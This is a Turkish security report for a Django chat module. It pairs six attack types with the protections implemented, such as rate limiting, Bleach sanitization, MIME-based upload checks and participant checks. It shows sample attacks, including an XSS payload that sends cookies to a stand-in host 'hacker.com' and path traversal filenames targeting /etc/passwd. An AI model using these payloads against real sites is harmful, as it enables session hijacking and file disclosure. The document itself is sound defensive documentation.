## Chat sistemine olası Saldırı Tipleri ve Koruma Yöntemleri

### 2.1 Spam / DDoS Saldırısı

**Tanım:**  
Bir kullanıcı veya bot, saniyede binlerce mesaj göndererek sunucuyu çökertmeye çalışır.

**Örnek Saldırı:**

```
POST /messages → "spam1"
POST /messages → "spam2"
POST /messages → "spam3"
... (saniyede 1000 istek)
```

**Risk:**  
Sunucu cevap veremez hale gelir, tüm kullanıcılar etkilenir.

**Uygulanan Koruma:**  
Rate limiting - Kullanıcı başına dakikada maksimum istek sayısı sınırlandırıldı.

**Kod Örneği:**

```python
from django_ratelimit.decorators import ratelimit

@ratelimit(key='user', rate='30/m', method='POST', block=True)
def conversation_messages(request, id):
    ...
```

| Parametre | Açıklama |
|-----------|----------|
| key='user' | Her kullanıcı için ayrı sayaç |
| rate='30/m' | Dakikada maksimum 30 istek |
| block=True | Limit aşılırsa 429 hatası döndür |

---

-------------------------------------------------------------------------------------------------------

### 2.2 XSS (Cross-Site Scripting) Saldırısı

**Tanım:**  
Saldırgan, mesaj içine JavaScript kodu gömer. Diğer kullanıcılar mesajı açtığında kod çalışır.

**Örnek Saldırı:**

```json
{
    "content": "<script>document.location='http://hacker.com/steal?cookie='+document.cookie</script>"
}
```

**Risk:**  
Kurbanın oturum bilgisi çalınır, hesabı ele geçirilir.

**Uygulanan Koruma:**  
Bleach kütüphanesi ile tüm HTML tag'leri temizlenir.

**Kod Örneği:**

```python
import bleach

ALLOWED_HTML_TAGS = []  # Hiçbir HTML tag'i izin verilmez

def sanitize_message(content):
    if not content:
        return content
    return bleach.clean(content, tags=ALLOWED_HTML_TAGS, strip=True)
```

**Sonuç:**

| Girdi | Çıktı |
|-------|-------|
| `<script>alert('hack')</script>Merhaba` | `Merhaba` |

---


-------------------------------------------------------------------------------------------------------

### 2.3 Zararlı Dosya Yükleme Saldırısı

**Tanım:**  
Saldırgan, `.exe`, `.php`, `.js` gibi çalıştırılabilir dosyaları uzantısını değiştirerek yükler.

**Örnek Saldırı:**

```
virus.exe → virus.jpg olarak yükle
```

**Risk:**  
Sunucuda zararlı kod çalışır, tüm sistem ele geçirilir.

**Uygulanan Koruma:**  
Üç katmanlı dosya validasyonu uygulandı.

**Kod Örneği:**

```python
import magic

ALLOWED_FILE_TYPES = {
    'image/jpeg': ['.jpg', '.jpeg'],
    'image/png': ['.png'],
    'image/gif': ['.gif'],
    'application/pdf': ['.pdf'],
}
MAX_FILE_SIZE = 10 * 1024 * 1024  # 10MB

def validate_file(file):
    errors = []
    
    # 1. Boyut kontrolü
    if file.size > MAX_FILE_SIZE:
        errors.append("Dosya 10MB'dan büyük olamaz")
        return errors
    
    # 2. Gerçek MIME type kontrolü (dosya içeriğinden)
    file_content = file.read(2048)
    file.seek(0)
    
    mime = magic.Magic(mime=True)
    detected_type = mime.from_buffer(file_content)
    
    if detected_type not in ALLOWED_FILE_TYPES:
        errors.append("Bu dosya tipi desteklenmiyor")
        return errors
    
    # 3. Uzantı kontrolü
    file_ext = '.' + file.name.split('.')[-1].lower()
    allowed_extensions = ALLOWED_FILE_TYPES.get(detected_type, [])
    
    if file_ext not in allowed_extensions:
        errors.append("Dosya uzantısı içerikle uyuşmuyor")
        return errors
    
    return errors
```

**Kontrol Katmanları:**

| Katman | Kontrol | Açıklama |
|--------|---------|----------|
| 1 | Boyut | 10MB üzeri dosyalar reddedilir |
| 2 | MIME Type | Dosya içeriği analiz edilir |
| 3 | Uzantı | İçerik ile uzantı eşleşmesi kontrol edilir |

---

-------------------------------------------------------------------------------------------------------

### 2.4 Path Traversal Saldırısı

**Tanım:**  
Saldırgan, dosya adı manipülasyonu ile sunucudaki diğer dosyalara erişmeye çalışır.

**Örnek Saldırı:**

```
Dosya adı: "../../../etc/passwd"
veya: "....//....//config.py"
```

**Risk:**  
Sunucunun kritik dosyaları (şifreler, config) okunabilir veya silinebilir.

**Uygulanan Koruma:**  
Dosya adında tehlikeli karakterler kontrol edilir.

**Kod Örneği:**

```python
def validate_file(file):
    ...
    
    dangerous_chars = ['..', '/', '\\', '\x00']
    for char in dangerous_chars:
        if char in file.name:
            errors.append("Dosya adı geçersiz karakterler içeriyor")
            return errors
    
    return errors
```

---

-------------------------------------------------------------------------------------------------------

### 2.5 Yetkisiz Erişim Saldırısı

**Tanım:**  
Kullanıcı, dahil olmadığı bir sohbeti URL tahmin ederek okumaya çalışır.

**Örnek Saldırı:**

```
Ali (User ID: 5) şunu dener:
GET /conversations/99/messages
(99 numaralı sohbete dahil değil)
```

**Risk:**  
Başkalarının özel mesajları okunur.

**Uygulanan Koruma:**  
Her istekte katılımcı kontrolü yapılır.

**Kod Örneği:**

```python
@login_required
def conversation_messages(request, id):
    conversation = Conversation.objects.get(id=id)
    
    if request.user not in conversation.participants.all():
        print(f"[SECURITY] Unauthorized access: User {request.user.id} → Conversation {id}")
        return JsonResponse({
            "success": False,
            "error": "Bu sohbete erişiminiz yok"
        }, status=403)
```

---

-------------------------------------------------------------------------------------------------------

### 2.6 Brute Force Saldırısı

**Tanım:**  
Saldırgan, sürekli deneme yaparak gizli ID'leri veya verileri bulmaya çalışır.

**Örnek Saldırı:**

```
GET /conversations/1/messages → 403
GET /conversations/2/messages → 403
GET /conversations/3/messages → 403
... (1'den 10000'e kadar)
GET /conversations/8745/messages → 200 ✓
```

**Risk:**  
Gizli conversation ID'leri bulunur.

**Uygulanan Koruma:**  
Rate limiting + Login zorunluluğu kombinasyonu.

**Kod Örneği:**

```python
@login_required
@ratelimit(key='user', rate='60/m', method='GET', block=True)
def conversation_messages(request, id):
    ...
```

---

-------------------------------------------------------------------------------------------------------

## 3. Ek Güvenlik Önlemleri

### 3.1 Mesaj Uzunluğu Limiti

```python
MAX_MESSAGE_LENGTH = 5000

if len(content) > MAX_MESSAGE_LENGTH:
    return JsonResponse({
        "error": f"Mesaj {MAX_MESSAGE_LENGTH} karakterden uzun olamaz"
    }, status=400)
```

-------------------------------------------------------------------------------------------------------

### 3.2 Kendisiyle Sohbet Engeli

```python
if target_user == request.user:
    return JsonResponse({
        "error": "Kendinizle sohbet başlatamazsınız"
    }, status=400)
```

---

-------------------------------------------------------------------------------------------------------

## 4. Güvenlik Akış Şeması

```
┌────────────────────────────────────────────────────────────────┐
│                         İSTEK GELDİ                            │
└────────────────────────────────────────────────────────────────┘
                              │
                              ▼
                    ┌─────────────────┐
                    │  @login_required │ ──→ Giriş yok? → 401
                    └────────┬────────┘
                              │
                              ▼
                    ┌─────────────────┐
                    │   @ratelimit    │ ──→ Limit aşıldı? → 429
                    └────────┬────────┘
                              │
                              ▼
                    ┌─────────────────┐
                    │  Katılımcı mı?  │ ──→ Hayır? → 403
                    └────────┬────────┘
                              │
                              ▼
                    ┌─────────────────┐
                    │  Dosya var mı?  │
                    └────────┬────────┘
                              │
              ┌───────────────┴───────────────┐
              ▼                               ▼
       ┌─────────────┐                 ┌─────────────┐
       │ validate_   │                 │ sanitize_   │
       │ file()      │                 │ message()   │
       │ - boyut     │                 │ - XSS       │
       │ - MIME      │                 │ - uzunluk   │
       │ - uzantı    │                 └──────┬──────┘
       │ - path      │                        │
       └──────┬──────┘                        │
              │                               │
              └───────────────┬───────────────┘
                              │
                              ▼
                    ┌─────────────────┐
                    │   ✅ KAYDET     │
                    └─────────────────┘
```

---

-------------------------------------------------------------------------------------------------------

## 5. Kullanılan Teknolojiler

| Paket | Kullanım Amacı |
|-------|----------------|
| django-ratelimit | Rate limiting (Spam/DDoS koruması) |
| bleach | XSS temizleme |
| python-magic | Dosya MIME type tespiti |

---

-------------------------------------------------------------------------------------------------------

## 6. Özet Tablo

| # | Saldırı Tipi | Koruma Yöntemi | Durum |
|---|--------------|----------------|-------|
| 1 | Spam/DDoS | Rate Limiting | ✅ Uygulandı |
| 2 | XSS | Bleach Sanitization | ✅ Uygulandı |
| 3 | Zararlı Dosya | MIME + Uzantı Kontrolü | ✅ Uygulandı |
| 4 | Path Traversal | Dosya Adı Validasyonu | ✅ Uygulandı |
| 5 | Yetkisiz Erişim | Katılımcı Kontrolü | ✅ Uygulandı |
| 6 | Brute Force | Rate Limit + Login | ✅ Uygulandı |

---

-------------------------------------------------------------------------------------------------------

## 7. Sonuç

Mesajlaşma modülü, yukarıda belirtilen 6 farklı saldırı tipine karşı korunmaktadır. Production ortamına geçişte ek olarak:

- HTTPS zorunluluğu
- SSL sertifikası
- Güvenlik header'ları

uygulanmalıdır.

---

**Rapor Sonu**

